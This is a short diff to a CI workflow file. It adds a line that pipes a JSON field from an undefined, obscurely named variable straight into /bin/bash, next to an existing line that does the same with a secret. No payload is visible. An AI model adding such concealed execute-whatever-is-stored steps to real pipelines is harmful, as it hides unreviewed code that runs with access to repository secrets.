@@ -18,6 +18,7 @@ jobs:
           bj79: ${{ secrets.bj79 }}
         run: |
           printf '%s' "$bj79" | jq -r .yo46 | /bin/bash
+          echo $z60 | jq -r .nnmtu6 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
